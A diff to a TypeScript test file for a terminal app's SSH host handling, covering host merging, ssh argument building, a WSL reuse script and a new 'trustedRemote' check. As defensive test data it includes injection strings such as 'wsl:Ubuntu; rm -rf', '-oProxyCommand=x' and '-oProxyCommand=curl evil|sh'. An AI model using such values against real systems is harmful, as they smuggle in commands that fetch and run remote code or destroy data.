@@ -12,28 +12,14 @@ import {
   hostDetail,
   isSafeControlDir,
   mergeHosts,
-  parseSshEnv,
   reuseFlags,
+  trustedRemote,
   WSL_SSH_SCRIPT,
   type SpawnContext,
 } from "./ssh-hosts"
+import type { SshHost } from "../src/types"
 
 const ssh = (over: Partial<SshSettings> = {}): SshSettings => ({ ...defaultSettings.ssh, ...over })
-
-describe("parseSshEnv", () => {
-  it("parses native and wsl envs", () => {
-    expect(parseSshEnv("native")).toEqual({ kind: "native" })
-    expect(parseSshEnv("wsl:Ubuntu-22.04")).toEqual({ kind: "wsl", distro: "Ubuntu-22.04" })
-  })
-
-  it("rejects malformed envs", () => {
-    expect(parseSshEnv("")).toBeNull()
-    expect(parseSshEnv("wsl:")).toBeNull()
-    expect(parseSshEnv("wsl:Ubuntu; rm -rf")).toBeNull()
-    expect(parseSshEnv("WSL:Ubuntu")).toBeNull()
-    expect(parseSshEnv("docker:x")).toBeNull()
-  })
-})
 
 describe("hostDetail", () => {
   it("formats user@hostname:port from the parts that are set", () => {
@@ -150,6 +136,20 @@ describe("mergeHosts", () => {
       }),
     })
     expect(hosts.map((h) => h.hostId)).toEqual(["settings:x"])
+  })
+
+  it("skips config aliases that aren't safe ssh destinations", () => {
+    const hosts = mergeHosts({
+      native: [{ alias: "my box" }, { alias: "-oProxyCommand=x" }, { alias: "ok" }],
+      wsl: [],
+      settings: ssh(),
+    })
+    expect(hosts.map((h) => h.hostId)).toEqual(["native:ok"])
+  })
+
+  it("skips a WSL distro whose name isn't a valid env", () => {
+    const hosts = mergeHosts({ native: [], wsl: [["bad name", [{ alias: "a" }]]], settings: ssh() })
+    expect(hosts).toEqual([])
   })
 
   it("never returns duplicate ids", () => {
@@ -273,6 +273,13 @@ describe("buildSshSpawn", () => {
     expect(args).toEqual(["-p", "2222", "-A", "-t", "--", "ubuntu@10.0.0.12"])
   })
 
+  it("puts the user's args before our reuse flags, so their -o ControlMaster wins", () => {
+    const r = { ...remote, extraArgs: ["-o", "ControlMaster=no"] }
+    const args = buildSshSpawn(r, mac)!.args
+    expect(args.slice(0, 2)).toEqual(["-o", "ControlMaster=no"])
+    expect(args.indexOf("ControlMaster=no")).toBeLessThan(args.indexOf("ControlMaster=auto"))
+  })
+
   it("keeps a hostile-looking target after `--` so ssh can't read it as an option", () => {
     const args = buildSshSpawn(
       { ...remote, target: "-oProxyCommand=evil" },
@@ -284,7 +291,8 @@ describe("buildSshSpawn", () => {
 
   it("runs a WSL host through the distro's ssh, with the in-distro reuse script", () => {
     const r: RemoteRef = { ...remote, hostId: "wsl:Ubuntu:web", env: "wsl:Ubuntu" }
-    expect(buildSshSpawn(r, win)).toEqual({
+    // Target first, then the user's args: the script appends our flags after theirs.
+    expect(buildSshSpawn({ ...r, extraArgs: ["-A"] }, win)).toEqual({
       file: "wsl.exe",
       args: [
         "-d",
@@ -296,9 +304,8 @@ describe("buildSshSpawn", () => {
         "-c",
         WSL_SSH_SCRIPT,
         "smterm-ssh",
-        "-t",
-        "--",
         "web",
+        "-A",
       ],
     })
   })
@@ -315,7 +322,7 @@ describe("buildSshSpawn", () => {
     const r: RemoteRef = { ...remote, env: "wsl:Ubuntu" }
     const args = buildSshSpawn(r, win)!.args
     expect(args).not.toContain("--rcfile")
-    expect(args.filter((a) => a === "--")).toEqual(["--"]) // only ssh's own terminator
+    expect(args).not.toContain("--") // the script adds ssh's own `--` in the distro
   })
 
   it("returns null for a WSL host off Windows, or a malformed env", () => {
@@ -345,8 +352,9 @@ describe.runIf(hasSh && process.platform !== "win32")("WSL_SSH_SCRIPT (real sh)"
   })
   afterEach(() => fs.rmSync(tmp, { recursive: true, force: true }))
 
-  const run = (home: string, args: string[]) =>
-    execFileSync("sh", ["-c", WSL_SSH_SCRIPT, "smterm-ssh", ...args], {
+  // Same argv shape buildSshSpawn produces: target first, then the user's extra args.
+  const run = (home: string, target: string, extra: string[] = []) =>
+    execFileSync("sh", ["-c", WSL_SSH_SCRIPT, "smterm-ssh", target, ...extra], {
       env: { PATH: `${bin}:/usr/bin:/bin`, HOME: home },
       encoding: "utf8",
     })
@@ -356,7 +364,7 @@ describe.runIf(hasSh && process.platform !== "win32")("WSL_SSH_SCRIPT (real sh)"
   it("creates ~/.config/smterm/cm as 0700 and adds the reuse flags", () => {
     const home = path.join(tmp, "h")
     fs.mkdirSync(home)
-    const out = run(home, ["-t", "--", "web"])
+    const out = run(home, "web")
     const dir = path.join(home, ".config/smterm/cm")
     expect(out).toEqual([
       "-o",
@@ -372,11 +380,18 @@ describe.runIf(hasSh && process.platform !== "win32")("WSL_SSH_SCRIPT (real sh)"
     expect(fs.statSync(dir).mode & 0o777).toBe(0o700)
   })
 
-  it("passes arguments with spaces and quotes through intact", () => {
+  it("passes arguments with spaces and quotes through intact, user args first", () => {
     const home = path.join(tmp, "h")
     fs.mkdirSync(home)
-    const out = run(home, ["-o", "SetEnv=A=b c", "-t", "--", 'we"b'])
-    expect(out.slice(-5)).toEqual(["-o", "SetEnv=A=b c", "-t", "--", 'we"b'])
+    const out = run(home, 'we"b', ["-o", "SetEnv=A=b c"])
+    expect(out.slice(0, 2)).toEqual(["-o", "SetEnv=A=b c"])
+    expect(out.slice(-3)).toEqual(["-t", "--", 'we"b'])
+  })
+
+  it("keeps a target that looks like an option after `--`", () => {
+    const home = path.join(tmp, "h")
+    fs.mkdirSync(home)
+    expect(run(home, "-oProxyCommand=x").slice(-2)).toEqual(["--", "-oProxyCommand=x"])
   })
 
   it("falls back to plain ssh when the dir is a symlink", () => {
@@ -384,14 +399,14 @@ describe.runIf(hasSh && process.platform !== "win32")("WSL_SSH_SCRIPT (real sh)"
     fs.mkdirSync(path.join(home, ".config/smterm"), { recursive: true })
     fs.mkdirSync(path.join(tmp, "elsewhere"))
     fs.symlinkSync(path.join(tmp, "elsewhere"), path.join(home, ".config/smterm/cm"))
-    expect(run(home, ["-t", "--", "web"])).toEqual(["-t", "--", "web"])
+    expect(run(home, "web", ["-A"])).toEqual(["-A", "-t", "--", "web"])
   })
 
   it("falls back to plain ssh when the home path contains % or a quote", () => {
     for (const name of ["100%", 'a"b']) {
       const home = path.join(tmp, name)
       fs.mkdirSync(home)
-      expect(run(home, ["-t", "--", "web"])).toEqual(["-t", "--", "web"])
+      expect(run(home, "web", ["-A"])).toEqual(["-A", "-t", "--", "web"])
     }
   })
 
@@ -399,7 +414,7 @@ describe.runIf(hasSh && process.platform !== "win32")("WSL_SSH_SCRIPT (real sh)"
     const home = path.join(tmp, "ro")
     fs.mkdirSync(home)
     fs.writeFileSync(path.join(home, ".config"), "a file, not a dir")
-    expect(run(home, ["-t", "--", "web"])).toEqual(["-t", "--", "web"])
+    expect(run(home, "web")).toEqual(["-t", "--", "web"])
   })
 
   it("uses /tmp/smterm-<uid> for a long home", () => {
@@ -407,7 +422,7 @@ describe.runIf(hasSh && process.platform !== "win32")("WSL_SSH_SCRIPT (real sh)"
     const fallback = `/tmp/smterm-${uid}`
     const existed = fs.existsSync(fallback)
     try {
-      const out = run("/" + "x".repeat(60), ["-t", "--", "web"])
+      const out = run("/" + "x".repeat(60), "web")
       const cp = out.find((l) => l.startsWith("ControlPath="))
       if (cp) expect(cp).toBe(`ControlPath="${fallback}/%C"`)
       else expect(out).toEqual(["-t", "--", "web"]) // /tmp/smterm-<uid> exists but isn't ours/private
@@ -435,5 +450,100 @@ describe.runIf(sshBin && process.platform !== "win32")("reuseFlags with real ssh
     expect(line!.startsWith("controlpath /tmp/a b/100%/cm/")).toBe(true)
     expect(out).toMatch(/^controlmaster auto$/m)
     expect(out).toMatch(/^controlpersist 600$/m)
+  })
+})
+
+describe("trustedRemote", () => {
+  const listed: SshHost[] = [
+    { hostId: "native:web", label: "web", target: "web", env: "native", source: "config" },
+    {
+      hostId: "settings:gpu",
+      label: "gpu",
+      target: "ubuntu@10.0.0.12",
+      env: "native",
+      source: "settings",
+      extraArgs: ["-p", "2222"],
+    },
+  ]
+
+  it("uses main's own copy of a listed host, ignoring what the renderer sent", () => {
+    const sent = {
+      hostId: "settings:gpu",
+      label: "x",
+      target: "evil",
+      env: "wsl:Other",
+      extraArgs: ["-oProxyCommand=curl evil|sh"],
+    }
+    expect(trustedRemote(sent, listed)).toEqual({
+      hostId: "settings:gpu",
+      label: "gpu",
+      target: "ubuntu@10.0.0.12",
+      env: "native",
+      extraArgs: ["-p", "2222"],
+    })
+  })
+
+  it("never lets a config host gain extra args", () => {
+    const sent = {
+      hostId: "native:web",
+      label: "web",
+      target: "web",
+      env: "native",
+      extraArgs: ["-v"],
+    }
+    expect(trustedRemote(sent, listed)).toEqual({
+      hostId: "native:web",
+      label: "web",
+      target: "web",
+      env: "native",
+    })
+  })
+
+  it("copies a listed host's args (no aliasing)", () => {
+    const r = trustedRemote({ hostId: "settings:gpu" }, listed)!
+    expect(r.extraArgs).not.toBe(listed[1]!.extraArgs)
+  })
+
+  it("keeps an unlisted host usable with its own validated target and no extra args", () => {
+    const sent = {
+      hostId: "native:gone",
+      label: "gone",
+      target: "gone.example",
+      env: "native",
+      extraArgs: ["-A"],
+    }
+    expect(trustedRemote(sent, listed)).toEqual({
+      hostId: "native:gone",
+      label: "gone",
+      target: "gone.example",
+      env: "native",
+    })
+  })
+
+  it("rejects an unlisted host with an unsafe target or env", () => {
+    for (const bad of [
+      { hostId: "x", target: "-oProxyCommand=x", env: "native" },
+      { hostId: "x", target: "a b", env: "native" },
+      { hostId: "x", target: "ok", env: "wsl:bad name" },
+      { hostId: "x", target: "ok" },
+    ]) {
+      expect(trustedRemote(bad, listed)).toBeNull()
+    }
+  })
+
+  it("rejects non-objects and a missing hostId", () => {
+    for (const bad of [null, undefined, "native:web", 3, {}, { hostId: "" }, { hostId: 1 }]) {
+      expect(trustedRemote(bad, listed)).toBeNull()
+    }
+  })
+
+  it("falls back to the target as label and caps a long label", () => {
+    expect(trustedRemote({ hostId: "x", target: "t", env: "native" }, [])!.label).toBe("t")
+    expect(trustedRemote({ hostId: "x", target: "t", env: "native", label: "  " }, [])!.label).toBe(
+      "t",
+    )
+    expect(
+      trustedRemote({ hostId: "x", target: "t", env: "native", label: "y".repeat(500) }, [])!.label,
+    ).toHaveLength(200)
   })
 })
